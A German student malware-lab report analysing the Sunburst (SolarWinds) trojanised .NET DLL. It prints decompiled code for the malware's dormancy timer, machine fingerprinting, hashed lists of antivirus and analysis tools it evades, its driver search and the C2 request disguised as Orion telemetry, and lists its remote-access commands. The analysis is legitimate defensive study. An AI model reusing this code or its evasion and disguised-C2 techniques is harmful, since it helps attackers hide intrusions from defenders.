# MALWLAB Aufgabe 05: C#-Malware

Analysereport von Aaron König, [aaron.koenig@stud.hslu.ch](aaron.koenig@stud.hslu.ch)

## 01. Zusammenfassung

Beim analysierten Sample handelt es sich um die trojanisierte DLL-Datei der Supply Chain-Attack [Sunburst](https://en.wikipedia.org/wiki/SolarWinds#SUNBURST). Sunburst war eine Attacke des Threat Actor [Cozy Bear](https://attack.mitre.org/groups/G0016/), der dem russischen Geheimdienst [SVR](https://de.wikipedia.org/wiki/Sluschba_wneschnei_raswedki) zugeordnet wird. Bei dieser Attacke gelang es über die Kompromittierung interner Build Pipelines von Solarwinds in die Netzwerke mehrer US-Behörden und diverser anderer SolarWinds-Kunden einzudringen. Die Malware wurde dabei von Solarwinds selbst über den normalen Solarwinds Update-Mechanismus ausgerollt.

Die DLL-Datei fungiert als Remote Access Trojan mit folgenden Funktionalitäten

- Ausführen und Beenden beliebiger Executables
- Vornehmen von Änderungen am Dateisystem
- Vornehmen von Änderungen an der Registry
- Neustart des Computers

## Tools

Bei der Analyse wurden folgende Software verwendet

- Arch Linux
- Windows 11
- Visual Studio Code
- AvaloniaILSpy


## 02. Initiale Triage

### Prüfen des Dateityps

```
file task5.dll 
task5.dll: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
```

Es handelt sich um eine .NET DLL. Da das Executable mit Ausnahme eines kurzen Bootstrappers in Bytecode geschrieben ist, mussdie Datei dekompiliert werden, um mit der Analyse fortzufahren.

### Erste Übersicht

Da es sich mit ca. 38'000 Codezeilen um ein relativ ausführliches Malware-Sample handelt, und da DLLs keine Main-Routine als Startpunkt haben, wäre eine vollständige Analyse der DLL im gegebenen Zeitbudget nicht möglich gewesen. Aus diesem Grund wurde zuerst versucht, sich eine erste Übersicht zu verschaffen, um die weitere Codeanalyse übersichtlicher zu gestalten.

Auf den ersten Blick auffällig ist der Paketname Solarwinds. Damit lag es nahe, dass es sich um ein Sample der Sunburst-Malware handelt. Um dies zu bestätigen wurde der Hash mit Quellen zu Sunburst abgeglichen.

```
sha256sum task5.dll
32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77  task5.dll
```

Eine kurze Webrecherche verwies tatsächlich auf [diesen Eintrag des NetbyteSEC Blogs](https://notes.netbytesec.com/2021/01/solarwinds-attack-sunbursts-dll.html), der dies bestätigt hat.

Sunburst war nicht eine Malware im üblichen Sinne, sondern ein trojanisiertes Solarwinds Orion-Plugin, bei welchem zusätzlicher Code über die Kompromittierung der Build Pipeline hinzugefügt worden war. Es kann also davon ausgegangen werden, dass es sich bei einem grossen Teil des Codes um legitimen Quellcode von Solarwinds handelt, was eine Analyse from the scratch noch weiter erschwert hätte. Daher wurde entschieden, das Sample nicht in seiner gänze zu analysieren, sondern gerade zu den Codestellen zu springen, die von den Angreifern hinzugefügt worden sind. Dafür wurde nochmals der obengenannte Blogartikel verwendet, der auf die Methode **OrionImprovementbusinessLayer.initialize** verweist.


## 02. Codeanalyse

### Initialisierung: Initialize-Methode

Die Methode Initialize tut im Wesentlichen folgendes:

1. Sie Prüft, in welchem Prozess wir uns befinden, und Bricht ab, falss es sich nicht um den korrekten Prozess handelt.
2. Sie prüft, ob die Malware bereits zwischen zwölf und vierzehn Tagen auf dem Computer ist, und führt nur aus, falls dies der Fall ist.
3. Sie Erstellt eine Named Pipe. Sofern die Pipe bereits vorhanden ist, wird eine Exception geworfen, die nicht gefangen wird. Dies sorgt vermutlich dafür, dass nur eine Instanz der Malware auf dem System ausgeführt wird.
4. Sie Ruft die Methode GetOrCreateUserID auf, die weiter unten genau erklärt wird.
5. Ruft die Funktion Update auf, die weiter unten genau erklärt wird.

```C#
	public static void Initialize()
	{
		try
		{
			if (GetHash(Process.GetCurrentProcess().ProcessName.ToLower()) != 17291806236368054941uL)//Are we in the right process? Return otherwise.
			{
				return;
			}
			DateTime lastWriteTime = File.GetLastWriteTime(Assembly.GetExecutingAssembly().Location);
			int num = new Random().Next(288, 336);
			if (DateTime.Now.CompareTo(lastWriteTime.AddHours(num)) < 0) //Only run if it is more than 288-336 hours since the executable was saved.
			{
				return;
			}
			//Creates a named pipe. If the named pipe. An exception will be thrown and not caught if the pipe already exists.
			instance = new NamedPipeServerStream(appId);
			//Reads the Value of reportStatus from a configuration file. Stops execution if it is set to truncate.
			ConfigManager.ReadReportStatus(out status);
			if (status == ReportStatus.Truncate)
			{
				return;
			}
			DelayMin(0, 0);§
			//Gets the domain of the current computer but not the host name.
			domain4 = IPGlobalProperties.GetIPGlobalProperties().DomainName;
			if (!string.IsNullOrEmpty(domain4) && !IsNullOrInvalidName(domain4))
			{
				DelayMin(0, 0);
				if (GetOrCreateUserID(out userId))
				{
					DelayMin(0, 0);
					ConfigManager.ReadServiceStatus(_readonly: false);
					Update();
					instance.Close();
				}
			}
		}
		catch (Exception)
		{
		}
	}
```

#### Erstellen eines Identifiers für den infizierten Computer: CetOrCreateUserID

Die Methode GetOrCreateUserID erstellt einen MD5-Hash der MAC-Adresse und der GUID des aktuellen Computers. Dieser wird von der Malware verwendet, um den identifizierten Computer weltweit eindeutig zu identifizieren. Um die obfuszierten Strings dieser Methode lesbar zu machen, wurde eine Kopie der [Deobfuscation-Methode](Unzipper.cs) erstellt.

```C#
	private static bool GetOrCreateUserID(out byte[] hash64)
	{
		string text = getDeviceMac();
		hash64 = new byte[8];
		Array.Clear(hash64, 0, hash64.Length);
		if (text == null)
		{
			return false;
		}
		text += domain4;
		try
		{
			                                             //Deobfuscated: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography                             //Deobfuscated: MachineGuid
			text += RegistryHelper.GetValue(ZipHelper.Unzip("8/B2jYz38Xd29In3dXT28PRzjQn2dwsJdwxyjfHNTC7KL85PK4lxLqosKMlPL0osyKgEAA=="), ZipHelper.Unzip("801MzsjMS3UvzUwBAA=="), "");
		}
		catch
		{
		}
		using (MD5 mD = MD5.Create())
		{
			byte[] bytes = Encoding.ASCII.GetBytes(text);
			byte[] array = mD.ComputeHash(bytes);
			if (array.Length < hash64.Length)
			{
				return false;
			}
			for (int i = 0; i < array.Length; i++)
			{
				hash64[i % hash64.Length] ^= array[i];
			}
		}
		return true;
	}
```

### Bootstrapping: Update-Methode

Die Methode Update fährt mit dem Bootstrapping der Malware fort. High level wird folgendes gemacht:

1. Es wird geprüft, ob unerwünschte Software wie Debugger und Antivirenprogramme laufen, und ob die Internetverbindung getrennt ist. In beiden Fällen wird die Ausführung abgebrochen.
2. Eine Reihe von Eckdaten für die weitere HTTP-Kommunikation werden generiert, wobei absichtlich mit irreführenden Variablennamen gearbeitet wurde, um das Reverse Engineering zu erschweren.
3. Die Methode HTTPHelper wird in einem eigenen Thread ausgeführt. Diese übernimmt die eigentliche C2-Kommunikation und das Dispatching der Command and Control-Kommandos.

### Prüfung nach unerwünschter Software

Die Methode Update() führt zuerst die Methode UpdateNotification aus, die zwei Dinge tut:

1. Suche nach Antivirenprogrammen oder anderer unerwünschter Software.
2. Prüfen der Internetverbindung

Falls entsprechende Antivirenprogramme gefunden werden, oder keine Internetverbindung bekannt ist, bricht die Malware an dieser Stelle ab. Wir möchten an dieser Stelle die Methoden genauer betrachten, mit denen nach unerwünschter Software gesucht wird:

#### Prozesse

Das Array "assemblyTimeStamps" enthält eine Liste von Hashes uneerwünschter Software:

```C#
	private static readonly ulong[] assemblyTimeStamps = new ulong[137]
	{
		2597124982561782591uL, 2600364143812063535uL, 13464308873961738403uL, 4821863173800309721uL, 12969190449276002545uL, 3320026265773918739uL, 12094027092655598256uL, 10657751674541025650uL, 11913842725949116895uL, 5449730069165757263uL,
		292198192373389586uL, 12790084614253405985uL, 5219431737322569038uL, 15535773470978271326uL, 7810436520414958497uL, 13316211011159594063uL, 13825071784440082496uL, 14480775929210717493uL, 14482658293117931546uL, 8473756179280619170uL,
		3778500091710709090uL, 8799118153397725683uL, 12027963942392743532uL, 576626207276463000uL, 7412338704062093516uL, 682250828679635420uL, 13014156621614176974uL, 18150909006539876521uL, 10336842116636872171uL, 12785322942775634499uL,
		13260224381505715848uL, 17956969551821596225uL, 8709004393777297355uL, 14256853800858727521uL, 8129411991672431889uL, 15997665423159927228uL, 10829648878147112121uL, 9149947745824492274uL, 3656637464651387014uL, 3575761800716667678uL,
		4501656691368064027uL, 10296494671777307979uL, 14630721578341374856uL, 4088976323439621041uL, 9531326785919727076uL, 6461429591783621719uL, 6508141243778577344uL, 10235971842993272939uL, 2478231962306073784uL, 9903758755917170407uL,
		14710585101020280896uL, 14710585101020280896uL, 13611814135072561278uL, 2810460305047003196uL, 2032008861530788751uL, 27407921587843457uL, 6491986958834001955uL, 2128122064571842954uL, 10484659978517092504uL, 8478833628889826985uL,
		10463926208560207521uL, 7080175711202577138uL, 8697424601205169055uL, 7775177810774851294uL, 16130138450758310172uL, 506634811745884560uL, 18294908219222222902uL, 3588624367609827560uL, 9555688264681862794uL, 5415426428750045503uL,
		3642525650883269872uL, 13135068273077306806uL, 3769837838875367802uL, 191060519014405309uL, 1682585410644922036uL, 7878537243757499832uL, 13799353263187722717uL, 1367627386496056834uL, 12574535824074203265uL, 16990567851129491937uL,
		8994091295115840290uL, 13876356431472225791uL, 14968320160131875803uL, 14868920869169964081uL, 106672141413120087uL, 79089792725215063uL, 5614586596107908838uL, 3869935012404164040uL, 3538022140597504361uL, 14111374107076822891uL,
		7982848972385914508uL, 8760312338504300643uL, 17351543633914244545uL, 7516148236133302073uL, 15114163911481793350uL, 15457732070353984570uL, 16292685861617888592uL, 10374841591685794123uL, 3045986759481489935uL, 17109238199226571972uL,
		6827032273910657891uL, 5945487981219695001uL, 8052533790968282297uL, 17574002783607647274uL, 3341747963119755850uL, 14193859431895170587uL, 17439059603042731363uL, 17683972236092287897uL, 700598796416086955uL, 3660705254426876796uL,
		12709986806548166638uL, 3890794756780010537uL, 2797129108883749491uL, 3890769468012566366uL, 14095938998438966337uL, 11109294216876344399uL, 1368907909245890092uL, 11818825521849580123uL, 8146185202538899243uL, 2934149816356927366uL,
		13029357933491444455uL, 6195833633417633900uL, 2760663353550280147uL, 16423314183614230717uL, 2532538262737333146uL, 4454255944391929578uL, 6088115528707848728uL, 13611051401579634621uL, 18147627057830191163uL, 17633734304611248415uL,
		13581776705111912829uL, 7175363135479931834uL, 3178468437029279937uL, 13599785766252827703uL, 6180361713414290679uL, 8612208440357175863uL, 8408095252303317471uL
	};
```

Diese Hashes werden mit der Funktion GetHash erstellt:

```C#
	private static ulong GetHash(string s)
	{
		ulong num = 14695981039346656037uL;
		try
		{
			byte[] bytes = Encoding.UTF8.GetBytes(s);
			foreach (byte b in bytes)
			{
				num ^= b;
				num *= 1099511628211L;
			}
		}
		catch
		{
		}
		return num ^ 0x5BAC903BA7D81967uL;
	}
```

Da kein Salting verwendt wurde, konnte verhältnismässig einfach [eine Applikation zum Bruteforcing der Hashes](Bruteforcer.cs) geschrieben werden. Eine Reihe unerwünschter Prozesse konnte damit ermittelt werden. Es handelt sich dabei nicht nur um Antivirus-Software, sondern auch um diverse Software, die von Malware-Experten für Reverse Engineering verwendet wird.

| Process Name | Software | Kategorie |
|--------------|----------|-----------|
| avp | Kaspersky Antivirus-Executable | Antivirus | 
| gdb | GNU Debugger | Malware-Analyse |
| idr | Interactive Delphi Recunstructur. | Malware-Analyse |
| dnsd | ? | ? |
| idaq | IDA PRO Interactive Disassembler.| Malware-Analyse |
| ksde | Kaspersky VPN Client | Antivirus |
| peid | Software zum Entpacken gepackter Executables | Malware-Analyse |
| ppee | Professional  PE file Explorer | Malware-Analyse |
| avgui | AVG Antivirus  | Antivirus |
| avpui | Kasperski Antivirus GUI | Antivirus |
| dnspy | dnSpy .Net Debugger and Disassembler | Malware-Analyse |
| ffdec | JPEXS Free Flash Decompiler | Malware-Analyse |
| floss | FLARE Obfuscated String Solver | Malware-Analyse |
| ilspy | C# Decompiler | Malware-Analyse |
| scdbg | Shellcode Analyse-Tool | Malware-Analyse |
| avgsvc| AVG Antivirus Service | Malware-Analyse |
| cutter | Free and Open Source Reverse Engineering Platform | Malware-Analyse |
| de4dot | .NET deobfuscator and unpacker | Malware-Analyse

#### Services

Die zu meidenden Services sind mit Hashes im Array svcList abgelegt.
```C#
	private static readonly ServiceConfiguration[] svcList = new ServiceConfiguration[8]
	{
		new ServiceConfiguration
		{
			timeStamps = new ulong[1] { 5183687599225757871uL },
			Svc = new ServiceConfiguration.Service[1]
			{
				new ServiceConfiguration.Service
				{
					timeStamp = 917638920165491138uL,
					started = true
				}
			}
		},
		new ServiceConfiguration
		{
			timeStamps = new ulong[1] { 10063651499895178962uL },
			Svc = new ServiceConfiguration.Service[1]
			{
				new ServiceConfiguration.Service
				{
					timeStamp = 16335643316870329598uL,
					started = true
				}
			}
    ...

```

#### Antivirus-Filtertreiber

Antivirenprogramme vor allem EDR-Tools nutzen filtertreiber, um Dinge wie gewisse Gerätezugriffe und Festplattenzugriff überwachen und nötigerweise verhindern zu können. Daher sucht die Malware neben Services und Prozessen auch nach entsprechenden Filtertreibern. Deren Namen werden ebenfalls als Hash im Array configTimeStamps gespeichert. Leider brachte unser Brutforcing in diesem zusammenang keine Namen zutage. Dies könnte daran liegen, dass die entsprechenden Treibernamen länger, als die sechs Zeichen sind, die mit dem gegebenen Zeitbudget bruteforced werden konnten.

```C#
	private static readonly ulong[] configTimeStamps = new ulong[17]
	{
		17097380490166623672uL, 15194901817027173566uL, 12718416789200275332uL, 18392881921099771407uL, 3626142665768487764uL, 12343334044036541897uL, 397780960855462669uL, 6943102301517884811uL, 13544031715334011032uL, 11801746708619571308uL,
		18159703063075866524uL, 835151375515278827uL, 16570804352575357627uL, 1614465773938842903uL, 12679195163651834776uL, 2717025511528702475uL, 17984632978012874803uL
	};



		private static bool SearchConfigurations()
		{
																				       //Deobfuscated: Select * From Win32_SystemDriver
			ManagementObjectSearcher val = new ManagementObjectSearcher(ZipHelper.Unzip("C07NSU0uUdBScCvKz1UIz8wzNooPriwuSc11KcosSy0CAA=="));
			try
			{
				ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
																																								    	   //Deobfuscated: PathName
						ulong hash = GetHash(Path.GetFileName(((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Properties().get_Item(ZipHelper.Unzip("C0gsyfBLzE0FAA==")).get_Value()
							.ToString())!.ToLower());
						if (Array.IndexOf(configTimeStamps, hash) != -1)
						{
							return true;
						}
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
			return false;
		}
```

### Kernfunktionalität

Die Klasse HTTPHelper wird in einem zweiten Thread gestartet. Sie ist für die C2-Kommunikation und das Ausführen der C2-Befehle verantwortlich. Die aufgerufene Methode Initialize tut folgendes:

1. Senden eines HTTP-Request an einen C2-Server
2. Parsen der Rückantwort
3. Ausführen des Kommandos für die Rückantwort

### Senden des HTTP-Requests

Der HTTP-Request scheint folgende Informationen zu enthalten:

- Die anfangs erwähnte UserID
- Eine SessionID, die beim Erstellen des HTTPHelpers al zufällige GUID generiert wird.
- Ein Timestamp
- In Index, der bei jeder Ausführung der Methode hochgezählt wird.
- Ein Feld Eventtype, das auf orion hard coded ist.
- Ein Feld Eventname, das auf EventManager hardcoded ist.
- Ein Feld namens Succeeded, das auf true hard coded ist.

Andere Werte scheinen mit Zufallszahlen gefüllt und eher für das Erschweren des Reverse Engineerings gedacht zu sein:

- Steps
- DurationMs
- Message

Die im Original obfuszierten Strings wurden im folgenden Codebeispiel deobfusziert, um die Lesbarkeit zu erleichtern.

```C#
...
	                text2 += string.Format("\"userId\":\"{0}\",", GetOrionImprovementCustomerId());
					text2 += string.Format("\"sessionId\":\"{0}\",", sessionId.ToString().Trim('{', '}'));
					text2 += "\"steps\":[";
					for (int i = 0; i < intArray.Length; i++)
					{
						num2 = ((random.Next(4) == 0) ? ((uint)random.Next(512)) : 0u);//??
						num3 += num2;
						if (intArray[i] > 0)
						{
							num3 |= 2;
							array3 = array.Skip(num).Take(intArray[i]).ToArray();
							num += intArray[i];
						}
						else
						{
							num3 &= 0xFFFFFFFFFFFFFFFDuL;
							array3 = new byte[random.Next(16, 28)];
							for (int j = 0; j < array3.Length; j++)
							{
								array3[j] = (byte)random.Next();
							}
						}
						text2 += "{";
						text2 += string.Format("\"Timestamp\":\"/Date({0})/\",", num3);
						text2 += string.Format("\"Index\":{0},", mIndex++);
						text2 += "\"EventType\":\"Orion\",";
						text2 += "\"EventName\":\"EventManager\",";
						text2 += string.Format("\"DurationMs\":{0},", num2);
						text2 += "\"Succeeded\":true,";
						text2 += string.Format("\"Message\":\"{0}\"", Convert.ToBase64String(array3).Replace("/", "\\/"));
						text2 += ((i + 1 != intArray.Length) ? "}," : "}");
					}
					text2 += "]}";
					httpWebRequest.ContentType = "application/json";
					array = Encoding.UTF8.GetBytes(text2);
				}
				if (httpOipExMethods == HttpOipExMethods.Post || requestMethod == HttpOipMethods.Put || requestMethod == HttpOipMethods.Post)
				{
					httpWebRequest.ContentType = "application/octet-stream";
				}
				return CreateUploadRequestImpl(httpWebRequest, array, out outData);
...
```
### Ausführen der Requests

Beim Parsen der Antwort der Command and Control-Server wird ein Enum "JobEngine" erstellt, welches festlegt, welche Art von Task ausgeführt werden soll:

```C#
		private enum JobEngine
		{
			Idle,
			Exit,
			SetTime,
			CollectSystemDescription,
			UploadSystemDescription,
			RunTask,
			GetProcessByDescription,
			KillTask,
			GetFileSystemEntries,
			WriteFile,
			FileExists,
			DeleteFile,
			GetFileHash,
			ReadRegistryValue,
			SetRegistryValue,
			DeleteRegistryValue,
			GetRegistrySubKeyAndValueNames,
			Reboot,
			None
		}
```

Daraus kann die Funktionalität der Malware vollständig abgeleitet werden:

| Funktion | Beschreibung |
|------|---------------------------|
| Idle | Keine Aktion auszuführen. | 
| Exit | Beendet die Malware-Ausführung. |
| CollectSystemDescription |  Sammelt Informationen über das aktuelle System. Siehe Unterkapitel. |
| UploadSystemDescription | Upload von Informationen über das System zum C2-Server. |
| RunTask | Startet einen neuen Prozess. |
| GetProcessByDescription | Upload von PID, Name und Parent PID aller gestarteten Prozesse. |
| KillTask | Terminiert einen Prozess. |
| GetFileSystemEntries | Gibt Dateien und Ordner innerhalb eines bestimmten Ordners aus. |
| WriteFile | Fügt zusätzliche Inhalte zu einer Datei hinzu. |
| FileExists | Prüft, ob eine bestimmte Datei existiert. |
| DeleteFile | Löscht eine Datei. |
| GetFileHash | Erstellt einen MD5-Hash einer Datei. |
| GetRegistryValue | Liest den Inhalt eines Registry-Knotens. |
| SetRegistryValue | Setzt den Wert eines Registry-Schlüssels. |
| DeleteRegistryValue | Löscht einen Wert aus einem RegistryKey. |
| GetRegistrySubKeyAndValueNames | Gibt die Namen aller Subkeys und Werte eines Registry Schlüssels aus. |
| Reboot | Neustart des Systems. |
| None | Keine Aktion auszufüren. Wird mehr oder weniger identisch zu JobEngine.Idle abgehandelt. |


#### CollectSystemDescription

Sammelt folgende Informationen über das System und leitet sie an den C2-Server weiter:

- Domain-Name
- SID des Administrator-Kontos
- Hostname
- Name des angemeldeten Benutzers
- OS-Version
- System-Directory (C:\Windows\system32)
- Informationen zum Netzwerkadapter
